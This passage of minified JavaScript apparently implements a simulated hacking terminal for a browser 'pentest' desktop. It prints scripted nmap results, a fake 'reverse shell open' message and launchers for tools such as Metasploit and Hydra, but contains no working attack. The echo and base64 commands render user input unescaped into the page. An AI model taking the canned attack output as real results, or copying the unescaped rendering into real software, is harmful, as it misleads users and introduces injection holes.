openApp("aicopilot"),c(t,'<span class="success">Opened AI Pentest Copilot window.</span>');break;case"uv":const u=(L=i[0])==null?void 0:L.toLowerCase();if(u==="run"){const y=i[1]||"XYZ.py";c(t,'<span class="info">Using Python 3.11 environment via uv</span>'),c(t,`<span class="success">[+] Running ${y}...</span>`),y.includes("create_mcp")||y.includes("mcp")?c(t,'<span class="out">[MCP Hub] Server running on stdio transport. Waiting for client handshake...</span>'):c(t,'<span class="out">Process exited with code 0 (success).</span>')}else u==="sync"||u==="init"?(c(t,'<span class="success">Resolved 42 packages in 32ms</span>'),c(t,'<span class="success">Audited dependencies. Environment synchronized with uv.lock.</span>')):(c(t,'<span class="info">uv 0.5.21 (Astral package installer & environment manager)</span>'),c(t,'<span class="out">Usage: uv &lt;run|sync|add|init&gt; [args...]</span>'));break;case"theme":i[0]&&O.includes(i[0].toLowerCase())?(setTheme(i[0].toLowerCase()),c(t,`<span class="success">Theme changed to ${i[0].toLowerCase()}</span>`)):(c(t,'<span class="warn">Usage: theme &lt;name&gt;</span>'),c(t,`<span class="out">Available: ${O.join(", ")}</span>`));break;case"notify":const v=i.join(" ")||"BuildU Security Alert: Port scan active";showToast("BuildU Terminal",v,"info","💬"),c(t,`<span class="success">Toast notification dispatched: "${v}"</span>`);break;case"ls":case"ll":case"dir":const m=i[0]?A.resolve(i[0],r):r,d=A.list(m);c(t,`<span class="info">total ${d.length*4} (${m})</span>`),d.length===0?c(t,'<span class="out" style="color:var(--text-dim)">(empty directory)</span>'):d.forEach(y=>{const S=y.isDir?"drwxr-xr-x":"-rw-r--r--",C=y.isDir?"var(--accent-cyan)":y.name.endsWith(".py")||y.name.endsWith(".sh")?"var(--accent-green)":"var(--text-primary)";c(t,`<span class="out" style="font-family:var(--font-mono)">${S}  root root  ${(y.size||4096).toString().padStart(6)} B  <span style="color:${C};font-weight:${y.isDir?"700":"400"}">${y.icon} ${y.name}${y.isDir?"/":""}</span></span>`)});break;case"pwd":c(t,`<span class="out">${r}</span>`);break;case"cd":const g=i[0]||"~",$=A.resolve(g,r);A.dirs.has($)?(l&&(l.cwd[o]=$),ne(s,$)):c(t,`<span class="err">cd: no such file or directory: ${i[0]}</span>`);break;case"cat":if(!i[0])c(t,'<span class="warn">Usage: cat &lt;file&gt;</span>');else{const y=A.read(i[0],r);y!==null?c(t,`<pre style="color:var(--text-primary);font-family:var(--font-mono);white-space:pre-wrap;margin:4px 0">${q(y)}</pre>`):c(t,`<span class="err">cat: ${i[0]}: No such file or directory</span>`)}break;case"touch":i[0]?(A.write(i[0],"",r),c(t,`<span class="success">Created ${i[0]} in VFS</span>`)):c(t,'<span class="warn">Usage: touch &lt;file&gt;</span>');break;case"mkdir":i[0]?(A.mkdir(i[0],r),c(t,`<span class="success">Created directory ${i[0]} in VFS</span>`)):c(t,'<span class="warn">Usage: mkdir &lt;dirname&gt;</span>');break;case"rm":i[0]?A.delete(i[0],r)?c(t,`<span class="success">Removed ${i[0]}</span>`):c(t,`<span class="err">rm: cannot remove '${i[0]}': No such file or directory</span>`):c(t,'<span class="warn">Usage: rm &lt;file&gt;</span>');break;case"nano":case"edit":if(openApp("texteditor"),i[0]){const y=A.resolve(i[0],r);setTimeout(()=>{const S=document.querySelector(".editor-area");if(S){S.value=A.read(y)||"";const C=document.querySelector(".editor-statusbar");C&&(C.querySelector("span:nth-child(2)").textContent=y)}},300)}c(t,`<span class="info">Opened ${i[0]||"new document"} in BuildU Text Editor</span>`);break;case"whoami":c(t,'<span class="success">root</span>');break;case"id":c(t,'<span class="out">uid=0(root) gid=0(root) groups=0(root),27(sudo),1000(buildu)</span>');break;case"uname":c(t,`<span class="out">Linux buildu 5.15.0-buildu-pentest-x86_64 #1 SMP PREEMPT ${new Date().toDateString()} x86_64 GNU/Linux</span>`);break;case"hostname":c(t,'<span class="out">buildu</span>');break;case"date":c(t,`<span class="out">${new Date().toString()}</span>`);break;case"ifconfig":case"ip":c(t,'<span class="info">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span>'),c(t,'<span class="out">      inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255</span>'),c(t,'<span class="out">      ether 00:1a:2b:3c:4d:5e  txqueuelen 1000  (Ethernet)</span>'),c(t,'<span class="info">wlan0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span>'),c(t,'<span class="out">      inet 10.0.0.50  netmask 255.255.255.0  broadcast 10.0.0.255</span>'),c(t,'<span class="out">      ether de:ad:be:ef:13:37  (Wireless 802.11ax - Monitor Mode Capable)</span>');break;case"ping":const k=i[0]||"8.8.8.8";c(t,`<span class="info">PING ${k} (target) 56(84) bytes of data.</span>`),[1,2,3,4].forEach(y=>{setTimeout(()=>{c(t,`<span class="out">64 bytes from ${k}: icmp_seq=${y} ttl=64 time=${(Math.random()*15+8).toFixed(2)} ms</span>`)},y*400)}),setTimeout(()=>{c(t,`<span class="success">--- ${k} ping statistics ---</span>`),c(t,'<span class="out">4 packets transmitted, 4 received, 0% packet loss, time 1602ms</span>')},2e3);break;case"ps":c(t,'<span class="info">  PID TTY          TIME CMD</span>'),[["1","?","0:01","systemd"],["2","?","0:00","kthreadd"],["100","?","0:05","metasploit-rpc"],["234","pts/0","0:00","bash"],["456","?","0:12","buildu-sec-daemon"],["789","?","0:00","wireshark-tap"]].forEach(([y,S,C,V])=>c(t,`<span class="out">${y.padStart(5)} ${S.padEnd(12)} ${C.padEnd(8)} ${V}</span>`));break;case"netstat":c(t,'<span class="info">Active Internet connections (servers and established)</span>'),c(t,'<span class="info">Proto  Local Address         Foreign Address       State</span>'),[["tcp","0.0.0.0:22","0.0.0.0:*","LISTEN"],["tcp","0.0.0.0:4444","0.0.0.0:*","LISTEN"],["tcp","192.168.1.100:54321","93.184.216.34:443","ESTABLISHED"],["udp","0.0.0.0:68","0.0.0.0:*",""]].forEach(([y,S,C,V])=>c(t,`<span class="out">${y.padEnd(7)}${S.padEnd(22)}${C.padEnd(22)}${V}</span>`));break;case"nmap":const E=i.join(" ")||"127.0.0.1";c(t,`<span class="info">Starting Nmap 7.94SVN ( https://nmap.org ) at ${new Date().toLocaleTimeString()}</span>`),c(t,`<span class="out">Nmap scan report for ${E}</span>`),setTimeout(()=>c(t,'<span class="success">PORT     STATE SERVICE     VERSION</span>'),400),setTimeout(()=>c(t,'<span class="success">21/tcp   open  ftp         vsftpd 2.3.4 (Backdoor vulnerable!)</span>'),800),setTimeout(()=>c(t,'<span class="success">22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1</span>'),1200),setTimeout(()=>c(t,'<span class="success">80/tcp   open  http        Apache httpd 2.4.52 ((Ubuntu))</span>'),1600),setTimeout(()=>c(t,'<span class="success">3306/tcp open  mysql       MySQL 8.0.35</span>'),2e3),setTimeout(()=>{c(t,'<span class="info">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>'),c(t,'<span class="success">Nmap done: 1 IP address (1 host up) scanned in 2.18 seconds</span>')},2400);break;case"msfconsole":c(t,'<span class="warn">[*] Launching Metasploit Framework GUI console...</span>'),openApp("metasploit");break;case"sqlmap":c(t,'<span class="info">[*] Opening SQLMap Attack Suite...</span>'),openApp("sqlmap");break;case"john":c(t,'<span class="info">[*] Opening John the Ripper Cracker...</span>'),openApp("john");break;case"hydra":c(t,'<span class="info">[*] Opening Hydra Network Brute-forcer...</span>'),openApp("hydra");break;case"aircrack-ng":c(t,'<span class="info">[*] Opening Aircrack-ng Suite...</span>'),openApp("aircrack");break;case"wireshark":c(t,'<span class="info">[*] Opening Wireshark Packet Analyzer...</span>'),openApp("wireshark");break;case"curl":const P=i[0]||"http://target.box";c(t,`<span class="info">[*] Sending HTTP GET to: ${P}</span>`),setTimeout(()=>{c(t,`<span class="out">HTTP/1.1 200 OK\r
Server: BuildU-Secure/1.0\r
Content-Type: text/html\r
\r
&lt;h1&gt;Welcome to Target Corp Internal Portal&lt;/h1&gt;</span>`)},500);break;case"python3":case"python":i[0]?A.read(i[0],r)?(c(t,`<span class="info">[Python 3.11.4] Executing ${i[0]}...</span>`),c(t,'<span class="success">[+] Exploit script loaded. Payload executing...</span>'),c(t,'<span class="success">[+] Target corrupted! Reverse shell open on port 4444.</span>')):c(t,`<span class="err">python3: can't open file '${i[0]}': [Errno 2] No such file or directory</span>`):(c(t,'<span class="info">Python 3.11.4 (BuildU Platform) [GCC 12.2.0] on linux</span>'),c(t,'<span class="out">Type "exit()" or "help()" for more info.</span>'));break;case"base64":if(i[0]==="-d"&&i[1])try{c(t,`<span class="out">${atob(i[1])}</span>`)}catch{c(t,'<span class="err">base64: invalid input</span>')}else try{c(t,`<span class="out">${btoa(i.join(" "))}</span>`)}catch{c(t,'<span class="err">base64: error</span>')}break;case"history":x.termHistory[s].slice().reverse().forEach((y,S)=>{c(t,`<span class="out">${String(S+1).padStart(4)}  ${y}</span>`)});break;case"clear":document.getElementById(`to-${((f=x.termTabs[s])==null?void 0:f.activeTab)??0}-${s}`).innerHTML="";break;case"echo":c(t,`<span class="out">${i.join(" ")}</span>`);break;case"exit":case"quit":closeWindow(s);break;case"":break;default:c(t,`<span class="err">bash: ${q(a)}: command not found</span>`),c(t,`<span class="out">Type 'help' for available commands</span>`)}}function ne(e,t){const s=document.getElementById(`tprompt-${e}`);s&&(s.innerHTML=`┌──(root㉿buildu)-[${t}]<br>└─# `)}window.addTermTab=function(e){const t=x.termTabs[e];if(!t)return;const s=t.tabs.length;t.tabs.push(`bash ${s+1}`),t.cwd.push("/root");const o=document.getElementById(`ttabs-${e}`),n=o==null?void 0:o.querySelector(".term-add-tab");if(o&&n){const a=document.createElement("div");a.className="term-tab",a.id=`tab${s}-${e}`,a.textContent=`bash ${s+1}`,a.onclick=()=>switchTermTab(s,e),o.insertBefore(a,n);const i=document.getElementById(`tc-${e}`),l=i==null?void 0:i.querySelector(".terminal-output");if(i&&l){const r=document.createElement("div");r.className="terminal-output",r.id=`to-${s}-${e}`,r.style.display="none",i.insertBefore(r,i.querySelector(".terminal-input-row")),hs(e,s,r)}switchTermTab(s,e)}};function hs(e,t,s){c(s,'<span class="success">New terminal session</span>')}window.switchTermTab=function(e,t){var a;const s=x.termTabs[t];if(!s)return;s.activeTab=e,document.querySelectorAll(`[id^="tab"][id$="-${t}"]`).forEach(i=>i.classList.remove("active")),(a=document.getElementById(`tab${e}-${t}`))==null||a.classList.add("active");const o=document.getElementById(`tc-${t}`);o==null||o.querySelectorAll(".terminal-output").forEach(i=>i.style.display="none");const n=document.getElementById(`to-${e}-${t}`);n&&(n.style.display="block",n.scrollTop=n.scrollHeight),ne(t,s.cwd[e]||"/root")};function ys(e){const t=()=>{const o=Math.floor((Date.now()-x.bootTime)/1e3),n=Math.floor(o/3600),a=Math.floor(o%3600/60),i=o%60,l=document.getElementById(`uptime-${e}`);if(!l)return;l.textContent=`${n}:${String(a).padStart(2,"0")}:${String(i).padStart(2,"0")}`;const r=Math.floor(Math.random()*60+10),b=Math.floor(Math.random()*50+20),h=Math.floor(Math.random()*30+40),T=Math.floor(Math.random()*20+5),L=Math.floor(Math.random()*500)+" KB/s",f=Math.floor(Math.random()*800)+" KB/s";W(e,"cpu0",r),W(e,"cpu1",b),W(e,"mem",h),W(e,"disk",T);const p=document.getElementById(`tx-${e}`),u=document.getElementById(`rx-${e}`);p&&(p.textContent=L),u&&(u.textContent=f)};t();const s=setInterval(()=>{if(!document.getElementById(`uptime-${e}`)){clearInterval(s);return}t()},1500)}function W(e,t,s){const o=document.getElementById(`${t}-${e}`),n=document.getElementById(`${t}b-${e}`);o&&(o.textContent=s+"%"),n&&(n.style.width=s+"%")}function q(e){return e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}window.changeWallpaper=function(){x.currentWallpaper=(x.currentWallpaper+1)%x.wallpapers.length,se(x.currentWallpaper)};window.showAbout=function(){document.getElementById("about-modal").style.display="flex"};window.closeAbout=function(){document.getElementById("about-modal").style.display="none"};document.addEventListener("keydown",e=>{e.ctrlKey&&e.altKey&&e.key==="t"&&openApp("terminal"),e.ctrlKey&&e.altKey&&e.key==="f"&&openApp("filemanager"),e.key==="F1"&&(e.preventDefault(),toggleAppMenu()),e.key==="Escape"&&(document.getElementById("app-menu").style.display="none",document.getElementById("context-menu").style.display="none")});window.addEventListener("resize",()=>{["matrix-canvas","login-canvas"].forEach(e=>{const t=document.getElementById(e);t&&t.style.display!=="none"&&(t.width=window.innerWidth,t.height=window.innerHeight)})});document.querySelectorAll(".desktop-icon").forEach(e=>{e.addEventListener("click",t=>{document.querySelectorAll(".desktop-icon").forEach(s=>s.classList.remove("selected")),e.classList.add("selected")})});
